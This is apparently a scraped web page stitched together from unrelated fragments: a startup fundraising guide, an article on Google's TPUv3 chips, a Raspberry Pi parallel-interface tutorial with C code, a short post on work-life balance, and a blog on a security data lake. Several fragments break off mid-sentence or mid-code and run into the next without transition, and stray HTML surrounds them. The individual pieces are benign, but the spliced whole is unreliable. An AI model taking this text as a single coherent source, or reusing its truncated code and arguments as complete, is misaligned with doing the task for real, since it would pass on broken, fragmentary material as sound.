href="https://academind.com/learn/react/context-api-with-hooks">part 2</a> of this article.</p><div data-language="jsx"><pre><code>

It’s incredibly opaque, asymmetrical, and is often the difference between having a company and not. Even the most experienced founder may have only fundraised 5-10 times in their life, while VCs engage in this process daily.</p><p>Nonetheless, it’s also a very exciting time for a founder. Very few people ever get the chance to raise millions of dollars from top tier VCs. As a result, I often see founders rush into the process, setting up investor meetings before they’re truly prepared and end up with a bad outcome. This is a missed opportunity because the fundraising process is a great forcing-function for getting you to think deeply about your business and where it’s going.</p><p>Over the last decade I have personally helped dozens of companies raise capital, from pre-seed to Series C rounds, and through these experiences I’ve seen a lot of effective, and also counterproductive, fundraising patterns. I shared many of these learnings in <a href="https://podcasts.apple.com/gb/podcast/deepdive-into-startup-fundraising-with-marc-mccabe/id1457400066?i=1000447317091">a lengthy podcast interview</a> a year ago in, but with a prod from Lenny I felt like now was a good time to revisit this topic.</p><p><strong>This guide is for founders of technology businesses who have raised their seed round, and are thinking forward to their next fundraise</strong>. It’s most relevant for Series A, but a lot of the same concepts apply for seed rounds, Series B and to a certain extent Series C. While most tech businesses can benefit from this guide, there are plenty of exceptions, especially companies with products which take a long time to get to market, and companies raising capital outside the US. Consider yourself caveated.</p><p><strong>Ultimately, fundraising is an exercise in building trust. </strong>Every week we read about new Series A, B and C rounds. We hear about pre-emptive offers and blank check term sheets from prominent investors. All of this can lull us into thinking raising capital is easy. Yet, each partner at a fund generally only makes 1-3 early-stage investments per year, and their career is ultimately staked to how successful these investments are. Each investment is incredibly significant to each fund and in order to convince a fund that you are worthy of that big check, you need them to feel incredibly confident that you will take the money and use it to take your business to a new level, whereby you could raise future funding and ultimately build a huge business. With that in mind, let’s get started with how I like to manage the various steps from thinking about fundraising to closing.&nbsp;</p><p><strong>I typically break up a fundraising process into 4 steps:</strong></p><ol><li><p>Preparation</p></li><li><p>Outreach</p></li><li><p>Navigating the process</p></li><li><p>Partner meetings + closing</p></li></ol><p>Let’s walk through each of these stages one by one.</p><h2>Step 1: Preparation</h2><p><strong>First, you need to figure out </strong><em><strong>why</strong></em><strong> and </strong><em><strong>when</strong></em><strong> you should raise a round</strong>. Maybe this seems obvious, but rather than looking at new investment as an opportunity, many founders only start fundraising when they are running out of money. VC’s don’t invest because you’re running out of money – they invest because they believe their equity stake will be worth a lot more in the future.</p><p><em>When</em> you should raise a Series A round is a blog post unto itself, and I’m not going to go in depth here. The truth is that there isn’t just one factor that will say you’re ready to raise Series A. For example, in SaaS, it’s common that companies that have achieved $1M ARR are told they are ready, but growth rate is a factor as well, and ARR doesn’t always apply for consumer focused businesses.&nbsp;</p><p><strong>Generally the way to think about whether you are ready for a Series A is whether you’ve proven <a href="https://a16z.com/2017/02/18/12-things-about-product-market-fit/">a credible value hypothesis</a></strong>. This is a combination of factors including the market you’re attacking, the features you’ve built to exploit the opportunity, and how well your product is finding its fit in the market. I often describe Series A as the “Product-Market Fit Round”: You want to show that you’ve convinced a slice of your market that your product is valuable enough to pay for (or if it’s free, use very regularly), and that this user base is growing. While seed rounds are intended to explore an idea and find some fit in the market, raising a Series A helps you pour more fuel on the fire.</p><p>Investors ultimately want to invest in growth. If a company is growing fast relative to its peers, this can make up for lower ARR especially if the business seems defensible and sustainable. It’s often helpful to speak with your seed investors early on about it, especially if they have experience raising capital themselves, to understand what milestones would make most sense to support a new round in the future.</p><p>When you think that you’re ready, the first step is to start pulling together your key metrics and wins,&nbsp; such as your growth rates, revenue numbers, customer testimonials, user feedback, and achievements. As mentioned, what makes you ready for Series A varies greatly, so find data points that will get investors excited about your business.</p><h4><strong>In terms of materials, I advise founders to prepare the following at a minimum:</strong></h4><ol><li><p><strong>A short blurb about your business</strong>, including a couple of headline numbers that indicate the business is doing well</p></li><li><p><strong>A short teaser deck</strong> (3-7 slides)</p></li><li><p><strong>A longer presentation deck</strong> (12-15 slides)</p></li><li><p><strong>A 2-3 year forecast</strong> with assumed fundraise secured</p></li><li><p><strong>Optional: <a href="https://www.rippling.com/blog/company-news/rippling-series-a-pitch-deck-and-memo/">Metrics deck</a></strong> or a data room. Sometimes you will get asked for this at Series A, sometimes not. t helps if you ask your prospective VCs in the first meeting whether they’ll ask for it.</p></li></ol><p>You can find some good references for building pitches <a href="https://www.sequoiacap.com/article/writing-a-business-plan/">here</a>, <a href="https://piktochart.com/blog/startup-pitch-decks-what-you-can-learn/">here</a> and <a href="https://medium.com/@zebulgar/how-to-raise-money-before-launch-a3544ef4dba6">here</a>.</p><p>The key is that your materials tell a compelling story. They need to explain what you’re building, why you’re building it, and how your strategy will capture considerable revenue in the future. The better this story ties everything together, the more your business will seem insightful. Ultimately we’re all human, and strong narratives that help explain the world around us are more compelling than a selection of disparate, albeit impressive, data points. </p><blockquote><p>“If you can’t tell a credible and compelling story about your vision and how your plans will capitalize on broader societal, market, cultural, economic or other trends, you’re dead in the water. I believe my own secret to fundraising success was that I always spoke to the broader changes I saw happening in the world and my conviction about the opportunities they presented.”</p><p>— <a href="https://www.linkedin.com/in/eoghanmccabe">Eoghan McCabe</a>, co-founder Intercom</p></blockquote><p>As an early investor in Intercom, it always impressed me how consistent the narrative stayed from when the company started up until today.</p><p>The shorter teaser deck is for sharing over email but be mindful that you don’t want to share everything with VCs ahead of meeting your lead partner. Hence the longer deck for your in-person (or Zoom meetings). Remember, it’s a trust building exercise. In a relationship, trust is built over many interactions over a long period of time. You want to show some positive elements to get investors interested, but leave good content in reserve.</p><p>One thing that Covid has changed is that building a relationship with a VC, with fewer in-person meetings, is now harder. Think about this with respect to your materials. To make up for the lack of in-person face time, you need to find more digital approaches to building this relationship than before. <a href="https://twitter.com/caitlinbolnick1/status/1290375205362098177">Caitlin Bolnick recently had an excellent thread about this</a>&nbsp; so consider preparing some of the following extra materials:</p><ol><li><p>A Loom of your product flow explaining how you made key design decisions and how these relate to the use case or market</p></li><li><p>An appendix of interesting information you yourself have read or viewed that inspired your approach</p></li><li><p>A compilation of customer testimonials&nbsp;</p></li></ol><p>You will need more content than ever to help build a shared belief in what you’re doing and why. <strong>I typically recommend spending at least 4 weeks building the deck and supporting materials.</strong> I find founders realize there are stronger elements they should have included 1-2 weeks into the pitch process. Taking time to get the narrative right and letting your points crystallize will likely result in a stronger deck from the start.&nbsp;</p><p>An important component in building this content is a part of the process I like to call <strong>“Hardening the Pitch”</strong>. Typically I recommend founders prepare their materials to about 70% completeness and then test them before going into battle. Put together a coherent story with great supporting data (not necessarily heavily designed). Find 4-6 people in your network, who have either fundraised at Series A for their own startup (ideally in the same or similar space), are friendly investors who know the space (perhaps from your seed investors), or even growth stage investors. Practice your pitch with them. Testing your materials and thesis before you hit the full pitch gauntlet will build your confidence and reps on the pitch. It will also provide you with helpful feedback and, …</p></div></div>

            <!-- content --><p>The world of training big AI models is no longer the realm of a desktop or a few servers. Big AI research organizations are using thousands of accelerators to train huge models. Google, a major force in AI training, designs its own accelerators and systems to use both for internal purposes, as well as to rent via the Google Cloud platform. At Hot Chips 32 (2020) we had the chance to learn a bit more about the Google TPUv3 and the improvements over <a href="https://www.servethehome.com/google-enables-tpu-v2-pod-training-gcp/">TPUv2 pods</a>.<span id="more-46464"></span></p>
<h2>Google TPUv3 at Hot Chips 32</h2>
<p>Starting with the basic building block, the chips under the cold plates in the cover image above, this is the basic block diagram for the TPUv3. One can see the two cores, their vector, scalar, matrix multiply, and transpose/ permute units. There is HBM memory as well. One can see PCIe connectivity to a host as well as a high-speed interconnect.</p>
<figure id="attachment_46470" aria-describedby="caption-attachment-46470"><a href="https://www.servethehome.com/google-tpuv3-discussed-at-hot-chips-32/hc32-google-tpuv3-overview-diagram/" rel="attachment wp-att-46470"><img src="https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Overview-Diagram.jpg" alt="HC32 Google TPUv3 Overview Diagram" width="1370" height="747" srcset="https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Overview-Diagram.jpg 1370w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Overview-Diagram-400x218.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Overview-Diagram-800x436.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Overview-Diagram-696x379.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Overview-Diagram-1068x582.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Overview-Diagram-770x420.jpg 770w" sizes="(max-width: 1370px) 100vw, 1370px"></a><figcaption id="caption-attachment-46470">HC32 Google TPUv3 Overview Diagram</figcaption></figure>
<p>A big change with TPUv3 is that the matrix multiply units are doubled, just like the HBM capacity. This is an ugly image as we took it from the PDF version of Google’s talk. The presented version did not have the diagram over the text. It is somewhat amazing that Google can make massive AI training systems and index the world, but Google Slides gives this kind of export to PDF experience in 2020.</p>
<figure id="attachment_46469" aria-describedby="caption-attachment-46469"><a href="https://www.servethehome.com/google-tpuv3-discussed-at-hot-chips-32/hc32-google-tpuv3-architecture/" rel="attachment wp-att-46469"><img src="https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Architecture.jpg" alt="HC32 Google TPUv3 Architecture" width="1458" height="580" srcset="https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Architecture.jpg 1458w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Architecture-400x159.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Architecture-800x318.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Architecture-696x277.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Architecture-1068x425.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/08/HC32-Google-TPUv3-Architecture-1056x420.jpg 1056w" sizes="(max-width: 1458px) 100vw, 1458px"></a><figcaption id="caption-attachment-46469">HC32 Google TPUv3 Architecture</figcaption></figure>
<p>There are a number of other improvements beyond the MMU and HBM capacity doubling. The core frequencies, memory bandwidth, and interconnect link bandwidth all went up by 30% as well. When you see “4x nodes” in this diagram below, that is referring to the number of nodes per pod is scaling to 4x the previous generation (1024 up from 256.)</p>

<p>The TPUs are connected via a 2D Torus network for high-speed accelerator communication. There is also a PCIe link to host machines that provide the link to storage.</p>

<p>Taking a step back here, there are quite a few people who think that this is completely different from what NVIDIA is doing. As we showed in our <a href="https://www.servethehome.com/inspur-nf5488m5-review-a-unique-8x-nvidia-tesla-v100-server/">Inspur NF5488M5 review</a> as well as our&nbsp;<a href="https://www.servethehome.com/nvidia-dgx-a100-leapfrogs-previous-gen/">NVIDIA DGX A100</a> and&nbsp;<a href="https://www.servethehome.com/nvidia-dgx-a100-superpod-detailed-look/">NVIDIA DGX A100 SuperPod look</a>, NVIDIA is doing something similar. We can even look back to our <a href="https://www.servethehome.com/a-quick-hardware-overview-of-deeplearning12/">DeepLearning12</a> Tesla P100 build and see a similar theme. The NVIDIA A100 (and V100’s) have an interconnect on a HGX-2/ HGX A100 board.

<p>There are a few differences and some significant ones, but we just wanted to point out that there are, indeed, a lot of similarities in how the solutions are built at a high-level. From this high-level, we are comparing a BMW to a Tesla (car) rather than a BMW automobile to a bullet train.</p>
<p>The TPUv2 Google showed using large air coolers. With the TPUv3 we get liquid cooling which means a lower server height. As a result, the standard rack seems to have gone from the TPUv2’s 4×8 four across and eight high of TPUv2 boards to 2×16 of TPUv3 boards.</p>

<p>There are other changes, however, at the system level, we have 4x the number of accelerator chips but 9-10x the petaflops and 8x the memory. We can also see a big change to the cabling connectors on the left side of these nodes.</p>

<p>At Hot Chips 32, the company talked more about the software scaling they were seeing which lead to their recent&nbsp;<a href="https://www.servethehome.com/mlperf-0-7-results-when-winners-only-apply-nvidia-google-intel-huawei-inspur/">MLPerf 0.7 Training Results</a>.

<p>NVIDIA also saw the need to build a large internal-use cluster to aid in software development as we saw in&nbsp;<a href="https://www.servethehome.com/0-to-supercomputer-nvidia-selene-deployment/">0 to Supercomputer NVIDIA Selene Deployment</a>.</p>
<h2>Final Words</h2>
<p>The TPUv3 was announced in 2018 so hearing talk on it with a lot of obfuscated details in 2020 seems strange. This is especially so given the relatively open manner NVIDIA offerings are discussed. That may be due to NVIDIA having partners and a stack that is scaling from low-power to high-power chips and software across multiple domains. Still, we wish Google had used its multiple talks at Hot Chips 32 to go into more detail about the systems themselves especially since we are around two years after TPUv3 announcement. Google tends to be relatively opaque on its hardware (e.g. there is very little public information on the company’s Arm CPU usage.) Facebook and Microsoft tend to be much more open, AWS is somewhere in the middle. At this point, given Google’s scale, they are hard to imitate except for the other hyper-scale outfits. While it is great to see more, we wish Google would let its engineers show off their engineering prowess a bit more.</p>

<p>The Secondary Memory Interface (SMI) is a parallel I/O interface that is included in all the Raspberry Pi versions. It is rarely used due to the acute lack of publicly-available documentation; the only information I can find is in the source code to an external memory device driver <a href="https://github.com/Ysurac/raspberry_kernel_mptcp/blob/master/include/linux/broadcom/bcm2835_smi.h">here</a>, and an experimental IDE interface <a href="https://github.com/fenlogic/IDE_trial">here</a>.</p>



<p>However, it is a very useful general-purpose high-speed parallel interface, that deserves wider usage; in this post I’m testing it with digital-to-analogue and analogue-to-digital converters (DAC and ADC) but there are many other parallel-bus devices that would be suitable.</p>

<p>To take advantage of the high data rates, I’ll be using the C language, and Direct Memory Access (DMA); if you are unfamiliar with DMA on the RPi, I suggest you read my previous 2 posts on the subject, <a href="https://iosoft.blog/raspberry-pi-dma-programming/">here</a> and <a href="https://iosoft.blog/fast-data-capture-raspberry-pi/">here</a>.</p>



<h2>Parallel interface</h2>



<figure><img data-attachment-id="1941" data-permalink="https://iosoft.blog/2020/07/16/raspberry-pi-smi/smi2/" data-orig-file="https://iosoftblog.files.wordpress.com/2020/07/smi2.png" data-orig-size="447,123" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="smi2" data-image-description="" data-medium-file="https://iosoftblog.files.wordpress.com/2020/07/smi2.png?w=300" data-large-file="https://iosoftblog.files.wordpress.com/2020/07/smi2.png?w=447" src="https://iosoftblog.files.wordpress.com/2020/07/smi2.png?w=447" alt="" srcset="https://iosoftblog.files.wordpress.com/2020/07/smi2.png 447w, https://iosoftblog.files.wordpress.com/2020/07/smi2.png?w=150 150w, https://iosoftblog.files.wordpress.com/2020/07/smi2.png?w=300 300w" sizes="(max-width: 447px) 85vw, 447px"><figcaption>Raspberry Pi SMI signals</figcaption></figure>



<p>The SMI interface has up to 18 bits of data, 6 address lines, read &amp; write select lines. Transfers can be initiated internally, or externally via read &amp; write request lines, which can take over the uppermost 2 bits of the data bus. Transfer data widths are 8, 9, 16 or 18 bits, and are fully supported by First In First Out (FIFO) buffers, and DMA; this makes for efficient memory usage when driving an 8-bit peripheral, since a single 32-bit DMA transfer can automatically be converted into four 8-bit accesses.</p>



<p>If you have ever worked with the classic bus-interfaces of the original microprocessors, you’ll feel quite at home with SMI, but no need to worry about timing problems, because the setup, strobe &amp; hold times are fully programmable with 4 nanosecond resolution; what luxury!</p>



<p>The SMI functions are assigned to specific GPIO pins:</p>



<figure><img data-attachment-id="1947" data-permalink="https://iosoft.blog/2020/07/16/raspberry-pi-smi/rpi_smi_pins-2/" data-orig-file="https://iosoftblog.files.wordpress.com/2020/07/rpi_smi_pins-2.png" data-orig-size="611,631" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="rpi_smi_pins" data-image-description="" data-medium-file="https://iosoftblog.files.wordpress.com/2020/07/rpi_smi_pins-2.png?w=290" data-large-file="https://iosoftblog.files.wordpress.com/2020/07/rpi_smi_pins-2.png?w=611" src="https://iosoftblog.files.wordpress.com/2020/07/rpi_smi_pins-2.png?w=611" alt="" srcset="https://iosoftblog.files.wordpress.com/2020/07/rpi_smi_pins-2.png 611w, https://iosoftblog.files.wordpress.com/2020/07/rpi_smi_pins-2.png?w=145 145w, https://iosoftblog.files.wordpress.com/2020/07/rpi_smi_pins-2.png?w=290 290w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px"></figure>



<p>The GPIO pins to be included in the parallel interface are selected by setting their mode to ALT1; there is no requirement to set all the SMI pins in this way, so the I2C, SPI and PWM interfaces are still quite usable.</p>

<h4>Hardware</h4>



<p>The simplest device to drive from the parallel bus is a digital-to-analogue converter (DAC), using resistors from each data line to a common output. This arrangement is commonly known as an R-2R ladder, due to the resistor values needed.</p>



<p>I’ve used a pre-built device from Digilent (details <a href="https://store.digilentinc.com/r2r-module-retired/">here</a>, or newer version <a href="https://store.digilentinc.com/pmod-r2r-resistor-ladder-d-a-converter/">here</a>) but it is easy to make your own using discrete resistors; the least-significant is connected to GPIO8 (SD0), and the most-significant to GPIO15 (SD7).</p>



<h4>Software</h4>



<p>I’ll be making extensive use of the dma_utils functions that were created for my previous DMA projects, but before diving into the complication of SMI, it is helpful to test the hardware using simpler GPIO commands:</p>


<pre title="">#define DAC_D0_PIN      8
#define DAC_NPINS       8

extern MEM_MAP gpio_regs;
map_periph(&amp;gpio_regs, (void *)GPIO_BASE, PAGE_SIZE);

// Output value to resistor DAC (without SMI)
void dac_ladder_write(int val)
{
    *REG32(gpio_regs, GPIO_SET0) = (val &amp; 0xff) &lt;&lt; DAC_D0_PIN;
    *REG32(gpio_regs, GPIO_CLR0) = (~val &amp; 0xff) &lt;&lt; DAC_D0_PIN;
}

// Initialise resistor DAC
void dac_ladder_init(void)
{
    int i;
    
    for (i=0; i&lt;DAC_NPINS; i++)
        gpio_mode(DAC_D0_PIN+i, GPIO_OUT);
}

// Output sawtooth waveform
dac_ladder_init();
while (1)
{
    i = (i + 1) % 256;
    dac_ladder_write(i);
    usleep(10);
}
</pre>


<p>This is less-than-ideal because we have to use one command to set some I/O pins to 1, and another command to clear the rest to 0, so in the gap between them the I/O state will be incorrect; also we won’t get accurate timing with the usleep command.</p>



<p>To my surprise, when I ran this code on a Pi Zero, and viewed the output on an oscilloscope, it didn’t look too bad; however, as soon as I moved the mouse, there were very significant gaps in the output, so clearly we need to do better.</p>



<h4>SMI register definitions</h4>



<p>To use SMI, we first need to define the control registers, and the bit-values within them. The primary reference is bcm2835_smi.h from the Broadcom external memory driver, but I found this difficult to use in my code, so converted the definitions into C bitfields; this makes the code a bit less portable, but a lot simpler and easier to read.</p>



<p>Also, when learning about a new peripheral, it is helpful if the bitfield values can be printed on the console. This normally requires the tedious copying of register field names into string constants, but with a small amount of macro processing, this can be done with a single definition, for example the SMI CS register:</p>


<pre title="">#define REG_DEF(name, fields) typedef union {struct {volatile uint32_t fields;}; volatile uint32_t value;} name

#define SMI_CS_FIELDS \
    enable:1, done:1, active:1, start:1, clear:1, write:1, _x1:2,\
    teen:1, intd:1, intt:1, intr:1, pvmode:1, seterr:1, pxldat:1, edreq:1,\
    _x2:8, _x3:1, aferr:1, txw:1, rxr:1, txd:1, rxd:1, txe:1, rxf:1  
REG_DEF(SMI_CS_REG, SMI_CS_FIELDS);

volatile SMI_CS_REG  *smi_cs;

smi_cs  = (SMI_CS_REG *) REG32(smi_regs, SMI_CS);
</pre>


<p>The last bit of code is needed so that smi_cs points to the register in virtual memory; if you don’t understand why, I suggest you read my post on RPi DMA programming <a href="https://iosoft.blog/raspberry-pi-dma-programming/">here</a>. Anyway, the upshot of all this code is that we can access the whole 32-bit value of the register as smi_cs-&gt;value, and also individual bits such as smi_cs-&gt;enable, smi_cs-&gt;done, etc.</p>



<p>To print out the bit values, we use macros to convert the register definition to a string, then have a simple C parser:</p>


<pre title="">#define STRS(x)     STRS_(x) ","
#define STRS_(...)  #__VA_ARGS__

char *smi_cs_regstrs = STRS(SMI_CS_FIELDS);

// Display bit values in register
void disp_reg_fields(char *regstrs, char *name, uint32_t val)
{
    char *p=regstrs, *q, *r=regstrs;
    uint32_t nbits, v;
    
    printf("%s %08X", name, val);
    while ((q = strchr(p, ':')) != 0)
    {
        p = q + 1;
        nbits = 0;
        while (*p&gt;='0' &amp;&amp; *p&lt;='9')
            nbits = nbits * 10 + *p++ - '0';
        v = val &amp; ((1 &lt;&lt; nbits) - 1);
        val &gt;&gt;= nbits;
        if (v &amp;&amp; *r!='_')
            printf(" %.*s=%X", q-r, r, v);
        while (*p==',' || *p==' ')
            p = r = p + 1;
    }
    printf("\n");
}
</pre>


<p>Now we can display all the non-zero bit values using:</p>


<pre title="">disp_reg_fields(smi_cs_regstrs, "CS", *REG32(smi_regs, SMI_CS));
</pre>


<p>..which produces a display like..</p>


<pre title="">CS 54000025 enable=1 active=1 write=1 txw=1 txd=1 txe=1
</pre>


<h4>SMI registers</h4>



<p>The SMI registers are:</p>


<pre title="">CS:  control and status
L:   data length (number of transfers)
A:   address and device number
D:   data FIFO
DMC: DMA control
DSR: device settings for read
DSW: device settings for write
DCS: direct control and status
DCA: direct control address and device number
DCD: direct control data
</pre>


<p>You can specify up to 4 unique timing settings for read &amp; write, making 8 settings in total. The settings are specified by giving a 2-bit device number for each transaction; this selects 1 of the 4 descriptors for read or write. I’ve only used one pair of settings, and the ADC &amp; DAC don’t have address lines, so the address &amp; device register remains at zero.</p>



<p>Direct mode is a simple way of doing accesses using the appropriate timings, but without DMA; it has separate address, data and control registers.</p>



<p>Some notable fields in the control &amp; status register are:</p>



<p><strong>Enable</strong>: it is obvious that this bit must be set for SMI to work, but it is less obvious when that should be done. Initially, I assumed it was necessary to enable the interface before any other initialisation, but then it responded with the ‘settings error’ bit set. So now I do most of the configuration with the device disabled, then enable it before clearing the FIFOs and enabling DMA, otherwise the transfers go through immediately.</p>



<p><strong>Start</strong>: set this bit to start the transfer; the SMI controller will perform the number of transfers in the length register, using the timing parameters specified in DSR (for read) or DSW (for write). If there is a backlog of data (FIFO is full) the transaction may stall.</p>



<p><strong>Pxldat</strong>: when this ‘pixel data’ bit is set, the 8- or 16-bit data is packed into 32-bit words.</p>



<p><strong>Pvmode</strong>: I have no idea what this ‘pixel valve’ mode should do; any information would be gratefully received.</p>



<h4>Direct Mode</h4>



<p>As the name implies, SMI Direct Mode allows you to perform a single I/O transfer without DMA. However, it is still necessary to specify the timing parameters of the transfer, specifically:</p>



<ul><li>The clock period, that will be used for the following timing:<ul><li>The setup time, that is used by the peripheral to decode the address value</li><li>The width of the strobe pulse, that triggers the transfer</li><li>The hold time, that keeps the signals stable after the transfer</li></ul></li></ul>



<p>To add to the complication, the SMI controller can drive 4 peripheral devices, each with its own individual read &amp; write settings, so there are a total of 8 timing registers. I’m keeping this simple by always using the first register pair (for device zero) but it is worth remembering that you can define more than one set of timings, and quickly switch between them by setting the device number.</p>



<p>Likewise, I’m ignoring the address field since it is also redundant for my DAC; for safety, I clear all the SMI registers on startup, in case there are any residual unwanted values.</p>



<p>As it happens, this setup/strobe/hold timing is largely redundant for our simple resistor DAC (since it doesn’t latch the data) but we still need to specify something, for example if we want the overall cycle time to be 1 microsecond, this can be achieved with a clock period of 10 nanoseconds, setup 25, strobe 50, and hold 25, since (25 + 50 + 25) * 10 = 1000 nanoseconds. This is the code I use to set the timing:</p>


<pre title="">// Width values
#define SMI_8_BITS  0
#define SMI_16_BITS 1
#define SMI_18_BITS 2
#define SMI_9_BITS  3

// Initialise SMI interface, given time step, and setup/hold/strobe counts
// Clock period is in nanoseconds: even numbers, 2 to 30
void …</pre></div></article></div>

          <article>
            <p>I've met some hugely successful people. Some of them are happy. Some of them... aren't. I've noticed some things about the ones who aren't:</p>

<ul>
<li>They're obsessed with their careers</li>
<li>They spend a lot of time at work</li>
<li>They aren't fulfilled by the work they do</li>
<li>They aren't content with what they have</li>
</ul>

<p>In many circles, these people are way more successful than most of us. They probably have better networks. They might have fancier job titles. They certainly make more money.</p>

<p>The Silicon Valley meme goes, "start a company and sell it for so much money that you can say 'f*ck you' to anyone in the world." Or maybe an alternate career path is to climb the corporate ladder at Google until you've banked that privilege.</p>

<p><strong>So much toxic bullshit stems from that line of thinking.</strong></p>

<p>I'd rather have f*ck-that money—e.g., a moderate amount of money that empowers you to live a meaningful life. F*ck-that money isn't about being a pretentious asshole; it's about keeping your priorities straight. For example:</p>

<ul>
<li>Miss your kid's soccer practice to catch up on emails? F*ck that!</li>
<li>Power through lunch? F*ck that!</li>
<li>Skip the gym? F*ck that!</li>
<li>Work over the weekend? F*ck that!</li>
<li>Save that side project for when you have more free time? F*ck that!</li>
<li>You get the idea...</li>
</ul>

<p>At Honeybadger, this mindset has led us to turn down acquisition offers and investors—to stay small and grow naturally. We're not in this business to be rich; we're in it to be free.</p>

<p>Regret the best years of our lives?</p>

<p><strong>Fuck that.</strong></p>

                    <p><strong><em>Giving organizations and security engineers total control over their data</em></strong></p><p><strong>By: <a href="https://www.linkedin.com/in/rrleighton">Russell Leighton</a></strong></p><div><p>At its core, <a href="https://github.com/panther-labs/panther">Panther</a> is a data-driven platform that needs to store, manipulate, and query huge amounts of data to help answer important security questions.</p><p>In this blog, I’ll explain how we chose our datastore and why we took the bold step of <strong>fully</strong> opening it to customers. I’ll also share how Panther's open data infrastructure integrates with third-party applications and services. You’ll discover how this leads to improved security and transparency, and why we believe that data should never be trapped in a security platform.</p></div><h2 id="how-panther-processes-data">How Panther Processes Data</h2><figure><img src="https://lh4.googleusercontent.com/qFWoR_ckqNeDGC4aTvkJGLfqT7y_4cTzrXGYKLtuWMOs5Mk-MztbVXbHDqCPcDiwrtOsQTkOIjua2yqzRMWqRmCJkeHeOn87C9IHiKCRquouC-jXBiAB79WGNLI5NDEpErf7Xitt" alt=""></figure><p>One of Panther's core components is a log processing sub-system which takes raw logs and converts them into structured events that can be analyzed with <a href="https://docs.runpanther.io/log-analysis/rules">Python rules</a>. This system parses, normalizes, and extracts indicators (like IP addresses) from a <a href="https://docs.runpanther.io/log-analysis/supported-logs">variety of security data sources</a> like CloudTrail, Osquery, Okta, Suricata, and more. When rules are triggered by suspicious activity, alerts are generated and dispatched to destinations like Slack or PagerDuty. </p><p>The processed log data and all events related to an alert are stored and made searchable via SQL in a serverless Data Lake. This Data Lake is fully open and available to users of our system to enable post-processing, visualizations, training machine learning models, or anything else desired.</p><h2 id="a-modern-database-architecture">A Modern Database Architecture</h2><p>To keep up with cloud-scale data demands, small security teams need to scale very quickly. <a href="https://runpanther.io/">Panther</a> is built on a fully serverless architecture, that enables higher scale, more flexibility, and quicker time-to-value than traditional on-premises applications. The choice of database should be consistent with this architecture.</p><figure><img src="https://lh4.googleusercontent.com/SNAA5Y78k_5086xMXptPQja60Fq_ThGxm8LOiM7RIojSNsu5ia6pj32QsTz2tvjBZQhwfyKPmh2Y3f1TvJOGTQF5c4k7xt2tZgKmwe42Wd9uzDjzYyg_JH84vQlkDM5jouTLczHM" alt=""></figure><h3 id="database-as-a-service">Database as a Service</h3><p>We designed Panther to be fundamentally serverless to offer customers automatic scaling, lower operational load, lower cost, better security, and easier deployment. Being serverless also impacted our database decision because <strong>we do not want to manage any database servers</strong>! Therefore, our database must be exposed as a managed service.</p><h3 id="storage-decoupled-from-compute">Storage Decoupled from Compute</h3><p>Panther is a security data processing platform, which means huge volumes of data are expected to be processed and retained for long periods of time. For example, it’s not uncommon to consume 2-5TB of data per day and store that data for up to 3 years. To handle this heavy workload, Panther’s database must be extremely scalable. </p><p><strong>Decoupling storage from computation</strong> is the only way to achieve the scale needed to operate in a cloud-first world where data volumes continue to grow. This means data storage is not local to the compute nodes, but remote on the network. Remote storage adds latency to queries, but it allows the storage size to grow independently of the compute nodes which is incredibly important for security applications that need to retain petabytes of data that span years.</p><p>In contrast, if your database storage is local to your compute nodes, then to add storage capacity, more compute nodes must be added. This is expensive and wasteful when the usage is primarily historical data because compute nodes must be added simply to increase storage capacity when they are not needed for query speed. In addition, the more compute nodes that are added, the more operational burden it is to maintain patching and to replace failing nodes.</p><p>One way organizations work around this pain is by limiting the volume of security data they ingest, either in the form of low retention or filtering for only the most valuable data. These difficult tradeoffs significantly hinder the security team’s ability to effectively detect, investigate, and remediate security incidents.</p><p>You might ask: “You already decided that you want to use a database as a service. If the vendor manages the database, why do you care if storage is decoupled from compute?” The reason is that while the operational burden is removed by using the service, the underlying problems have <em>not</em> been resolved. The users of the service still suffer from excessive costs and data capacity issues--just ask anyone who’s had to resize a big Redshift cluster. Once storage is decoupled from compute, these issues simply disappear. In addition, new capabilities are now possible like running multiple query clusters concurrently and having other tools access the storage.</p><h3 id="support-for-complex-objects">Support for Complex Objects</h3><p>Security data is complex. The days of simple rows and columns with scalar values are gone. Today’s security data often originates as complex objects that express rich relationships necessary for answering critical security questions. <strong>Our database must</strong> <strong>support complex objects such as arrays, maps, and structs</strong>. A well-known example is AWS CloudTrail data which is composed of many complex elements, for example:</p><pre><code>{
  "Records": [
    {
      "eventVersion": "1.0",
      "userIdentity": {
